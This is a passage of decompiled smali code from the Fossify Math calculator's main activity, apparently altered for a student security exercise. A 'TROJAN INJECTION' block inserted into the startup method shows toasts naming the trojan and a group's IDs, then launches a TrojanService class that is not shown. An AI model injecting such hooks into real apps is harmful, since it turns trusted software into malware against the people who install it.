    # ── TROJAN INJECTION ──────────────────────────────────────────────
    move-object/from16 v13, p0

    # Toast 1: Unauthorized access active
    const-string v12, "TrojanService: Unauthorized access active"
    const/4 v11, 0x0
    invoke-static {v13, v12, v11}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
    move-result-object v12
    invoke-virtual {v12}, Landroid/widget/Toast;->show()V

    # Toast 2: Group member IDs
    const-string v12, "Group: IT23479678 | IT23201064 | IT23348370 | IT23378148"
    const/4 v11, 0x1
    invoke-static {v13, v12, v11}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
    move-result-object v12
    invoke-virtual {v12}, Landroid/widget/Toast;->show()V

    # Start TrojanService
    new-instance v12, Landroid/content/Intent;
    const-class v11, Lorg/fossify/math/TrojanService;
    invoke-direct {v12, v13, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {v13, v12}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method public final onDestroy()V
    .locals 1

    invoke-super {p0}, LZ4/g;->onDestroy()V

    invoke-virtual {p0}, Landroid/app/Activity;->isChangingConfigurations()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x0

    sput-object v0, Lorg/fossify/math/databases/CalculatorDatabase;->k:Lorg/fossify/math/databases/CalculatorDatabase;

    :cond_0
    return-void
.end method

.method public final onPause()V
    .locals 2

    invoke-super {p0}, Lj/i;->onPause()V

    invoke-static {p0}, LA5/a;->q(Landroid/content/Context;)LB5/d;

    move-result-object v0

    invoke-virtual {v0}, Lp5/b;->o()I

    move-result v0

    iput v0, p0, Lorg/fossify/math/activities/MainActivity;->N:I

    invoke-static {p0}, LA5/a;->q(Landroid/content/Context;)LB5/d;

    move-result-object v0

    invoke-virtual {v0}, Lp5/b;->k()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x80

    invoke-virtual {v0, v1}, Landroid/view/Window;->clearFlags(I)V

    :cond_0
    return-void
.end method

.method public final onResume()V
    .locals 15

    invoke-super {p0}, LZ4/g;->onResume()V

    invoke-virtual {p0}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->y:Lorg/fossify/commons/views/MyAppBarLayout;

    const/16 v1, 0xe

    const/4 v2, 0x0

    invoke-static {p0, v0, v2, v1}, LZ4/g;->J(LZ4/g;Lorg/fossify/commons/views/MyAppBarLayout;II)V

    invoke-virtual {p0}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->z:Landroidx/core/widget/NestedScrollView;

    invoke-virtual {p0}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v1

    iget-object v1, v1, Ly5/a;->y:Lorg/fossify/commons/views/MyAppBarLayout;

    invoke-virtual {p0, v0, v1}, LZ4/r;->C(LG1/w;Lorg/fossify/commons/views/MyAppBarLayout;)V

    iget v0, p0, Lorg/fossify/math/activities/MainActivity;->N:I

    invoke-static {p0}, LA5/a;->q(Landroid/content/Context;)LB5/d;

    move-result-object v1

    invoke-virtual {v1}, Lp5/b;->o()I

    move-result v1

    if-eq v0, v1, :cond_0

    invoke-virtual {p0}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->w:Landroid/widget/LinearLayout;

    if-eqz v0, :cond_0

    invoke-static {p0}, Ly4/a;->x(Landroid/content/Context;)I

    move-result v1

    invoke-static {p0, v0, v1}, LA5/a;->M(Lu5/f;Landroid/view/ViewGroup;I)V

    :cond_0
    invoke-static {p0}, LA5/a;->q(Landroid/content/Context;)LB5/d;

    move-result-object v0

    invoke-virtual {v0}, Lp5/b;->k()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x80

    invoke-virtual {v0, v1}, Landroid/view/Window;->addFlags(I)V

    :cond_1
    invoke-virtual {p0}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v0, v0, Ly5/a;->m:Landroid/widget/TextView;

    if-eqz v0, :cond_2

    invoke-static {}, Ljava/text/DecimalFormatSymbols;->getInstance()Ljava/text/DecimalFormatSymbols;

    move-result-object v1

    invoke-virtual {v1}, Ljava/text/DecimalFormatSymbols;->getDecimalSeparator()C

    move-result v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :cond_2
    invoke-static {p0}, LA5/a;->q(Landroid/content/Context;)LB5/d;

    move-result-object v0

    invoke-virtual {v0}, Lp5/b;->p()Z

    move-result v0

    iput-boolean v0, p0, Lorg/fossify/math/activities/MainActivity;->O:Z

    invoke-virtual {p0}, Lorg/fossify/math/activities/MainActivity;->M()Ly5/a;

    move-result-object v0

    iget-object v3, v0, Ly5/a;->r:Landroid/widget/TextView;

    iget-object v4, v0, Ly5/a;->t:Landroid/widget/TextView;

    iget-object v5, v0, Ly5/a;->v:Landroid/widget/TextView;

    iget-object v6, v0, Ly5/a;->l:Landroid/widget/TextView;

    iget-object v7, v0, Ly5/a;->u:Landroid/widget/TextView;

    iget-object v8, v0, Ly5/a;->n:Landroid/widget/TextView;

    iget-object v9, v0, Ly5/a;->q:Landroid/widget/TextView;

    iget-object v10, v0, Ly5/a;->s:Landroid/widget/TextView;

    iget-object v11, v0, Ly5/a;->p:Landroid/widget/TextView;

    iget-object v12, v0, Ly5/a;->o:Landroid/widget/TextView;

    iget-object v13, v0, Ly5/a;->m:Landroid/widget/TextView;

    filled-new-array/range {v3 .. v13}, [Landroid/widget/TextView;

    move-result-object v1

    move v3, v2

    :goto_0
    const v4, 0x7f0801da

    const/16 v5, 0xb

    if-ge v3, v5, :cond_5

    aget-object v5, v1, v3

    if-eqz v5, :cond_3

    invoke-virtual {p0}, Lj/i;->getResources()Landroid/content/res/Resources;

    move-result-object v6

    invoke-virtual {p0}, Landroid/content/Context;->getTheme()Landroid/content/res/Resources$Theme;

    move-result-object v7

    sget-object v8, Lw1/j;->a:Ljava/lang/ThreadLocal;

    invoke-virtual {v6, v4, v7}, Landroid/content/res/Resources;->getDrawable(ILandroid/content/res/Resources$Theme;)Landroid/graphics/drawable/Drawable;

    move-result-object v4

    invoke-virtual {v5, v4}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    :cond_3
    if-eqz v5, :cond_4

    invoke-virtual {v5}, Landroid/view/View;->getBackground()Landroid/graphics/drawable/Drawable;

    move-result-object v4

    if-eqz v4, :cond_4

    const/16 v5, 0x5a

    invoke-virtual {v4, v5}, Landroid/graphics/drawable/Drawable;->setAlpha(I)V

    :cond_4
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_5
    iget-object v5, v0, Ly5/a;->b:Landroid/widget/TextView;

    iget-object v6, v0, Ly5/a;->c:Landroid/widget/TextView;

    iget-object v7, v0, Ly5/a;->d:Landroid/widget/TextView;

    iget-object v8, v0, Ly5/a;->e:Landroid/widget/TextView;

    iget-object v9, v0, Ly5/a;->f:Landroid/widget/TextView;

    iget-object v10, v0, Ly5/a;->g:Landroid/widget/TextView;

    iget-object v11, v0, Ly5/a;->h:Landroid/widget/TextView;

    iget-object v12, v0, Ly5/a;->i:Landroid/widget/TextView;

    iget-object v13, v0, Ly5/a;->j:Landroid/widget/TextView;

    iget-object v14, v0, Ly5/a;->k:Landroid/widget/TextView;

    filled-new-array/range {v5 .. v14}, [Landroid/widget/TextView;

    move-result-object v0

    :goto_1
    const/16 v1, 0xa

    if-ge v2, v1, :cond_8

    aget-object v1, v0, v2

    if-eqz v1, :cond_6

    invoke-virtual {p0}, Lj/i;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    invoke-virtual {p0}, Landroid/content/Context;->getTheme()Landroid/content/res/Resources$Theme;

    move-result-object v5

    sget-object v6, Lw1/j;->a:Ljava/lang/ThreadLocal;

    invoke-virtual {v3, v4, v5}, Landroid/content/res/Resources;->getDrawable(ILandroid/content/res/Resources$Theme;)Landroid/graphics/drawable/Drawable;

    move-result-object v3

    invoke-virtual {v1, v3}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    :cond_6
    if-eqz v1, :cond_7

    invoke-virtual {v1}, Landroid/view/View;->getBackground()Landroid/graphics/drawable/Drawable;

    move-result-object v1

    if-eqz v1, :cond_7

    const/16 v3, 0x1e

    invoke-virtual {v1, v3}, Landroid/graphics/drawable/Drawable;->setAlpha(I)V

    :cond_7
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    :cond_8
    return-void
.end method

.method public final onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 4

    const-string v0, "bundle"

    invoke-static {v0, p1}, Lw4/k;->e(Ljava/lang/String;Ljava/lang/Object;)V

    invoke-super {p0, p1}, Lb/i;->onSaveInstanceState(Landroid/os/Bundle;)V

    iget-object v0, p0, Lorg/fossify/math/activities/MainActivity;->Q:LB5/b;

    if-eqz v0, :cond_0

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    iget-object v2, v0, LB5/b;->c:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    const-string v3, "res"

    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v2, v0, LB5/b;->d:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    const-string v3, "previousCalculation"

    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v2, v0, LB5/b;->f:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    const-string v3, "lastKey"

    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v2, v0, LB5/b;->g:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    const-string v3, "lastOperation"

    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v2, v0, LB5/b;->h:Ljava/lang/Object;

    check-cast v2, Ljava/math/BigDecimal;

    invoke-virtual {v2}, Ljava/math/BigDecimal;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "baseValue"

    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v2, v0, LB5/b;->i:Ljava/lang/Object;

    check-cast v2, Ljava/math/BigDecimal;

    invoke-virtual {v2}, Ljava/math/BigDecimal;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "secondValue"

    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v0, v0, LB5/b;->e:Ljava/lang/Object;

    check-cast v0, Ljava/lang/String;

    const-string v2, "inputDisplayedFormula"

    invoke-virtual {v1, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "calculatorState"

    invoke-virtual {p1, v1, v0}, Landroid/os/BaseBundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_0
    const-string p1, "calc"

    invoke-static {p1}, Lw4/k;->j(Ljava/lang/String;)V

    const/4 p1, 0x0

    throw p1
.end method
